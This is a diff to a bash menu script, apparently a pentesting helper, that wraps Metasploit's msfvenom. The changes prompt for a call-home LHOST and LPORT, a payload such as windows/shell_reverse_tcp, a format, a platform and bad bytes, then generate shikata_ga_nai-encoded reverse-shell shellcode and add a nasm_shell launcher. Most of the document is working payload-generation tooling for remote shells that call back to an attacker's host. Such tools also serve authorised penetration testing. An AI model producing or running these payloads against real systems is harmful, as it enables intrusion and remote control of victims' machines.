@@ -224,7 +224,7 @@ echo "[*] LHOST is "$LHOST
 echo ""
 echo "00) Select/Change Payload"
 echo "0) Setup Apache2 for file download"
-echo "1) Generate Windows Reverse SHELLCODE"
+echo "1) Generate SHELLCODE"
 echo "2) Generate Reverse tcp Shell exe"
 echo "3) Generate CUSTOM PAYLOAD"
 echo "4) Generate CUSTOM PAYLOAD and Handler"
@@ -232,6 +232,7 @@ echo "5) Generate Unique String of size N (Pattern_Create)"
 echo "6) Get Unique String Location for BOF (Pattern Offset)"
 echo "7) Search for MSF Payload"
 echo "8) Search for MSF Payload Format"
+echo "9) Find Op Codes NAS_SHELL"
 echo ""
 echo "99) to goto MAIN"
 echo ""
@@ -251,33 +252,58 @@ func_Setup_Apache2_Download
 func_MSFVEnom_Menu
 ;;
 1)
+commandlinearg="msfvenom"
+echo "Enter LHOST call home IP: "
+read lhost
+commandlinearg+=" LHOST="$lhost
+
+echo "[+] "$commandlinearg
 echo "Enter Lport call home port: "
 read lport
+commandlinearg+=" LPORT="$lport
 
+echo "[+] "$commandlinearg
+echo ""
 echo "Payloads Ref's:"
-echo "Linux=linux/x86/shell_reverse_tcp"
+echo "Linux=shell_bind_tcp"
 echo "Windows=windows/shell_reverse_tcp"
 echo ""
+echo "Search Term to look for in Payload title: "
+read searchterm
+echo "[*] Search results below...please wait for prompt"
+msfvenom -l payloads | grep $searchterm
+
+echo "[+] "$commandlinearg
 echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
 read payload
+commandlinearg+=" -p "$payload
 
-echo "Enter byte code to exclude(ie \x00\x0a\x0d\x20): "
-read Bytesofcode
-
-echo "Enter Arch type (x86 or x64):"
-read arch
-
+echo "[+] "$commandlinearg
 echo "[*] Generating List of Payload Formats...please wait for prompt"
 msfvenom -l formats
 echo "Payloads Ref's:"
 echo "Linux=-f elf"
-echo "Windows c"
+echo "'C' is useful for both Windows and Linux"
 echo ""
 echo "Enter Payload format: "
 read format
+commandlinearg+=" -f "$format
 
-msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format -a $arch --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai
-echo "[*] Using ... msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format a $arch --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai"
+echo "[+] "$commandlinearg
+echo "[*] Generating List of Payload Platforms to compile for...please wait for prompt"
+msfvenom -l platforms
+echo "Enter Payload Architiecture: "
+read platform
+commandlinearg+=" --platform "$platform
+
+echo "Enter Bad Byte Codes (ie \"\x00\"):"
+read Bytesofcode
+
+echo "Enter Arch type 'x86' or 'x64': "
+read arch
+
+msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format -a $arch --platform $platform -b "$Bytesofcode" -e shikata_ga_nai
+echo "[*] Using ... msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format -a $arch --platform $platform -b "$Bytesofcode" -e $arch/shikata_ga_nai"
 
 func_MSFVEnom_Menu
 ;;
@@ -426,6 +452,10 @@ func_MSFVEnom_Menu
 8)
 clear
 msfvenom -l formats
+func_MSFVEnom_Menu
+;;
+9)
+gnome-terminal --tab --title="NASM_SHELL" -- /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 func_MSFVEnom_Menu
 ;;
 99)
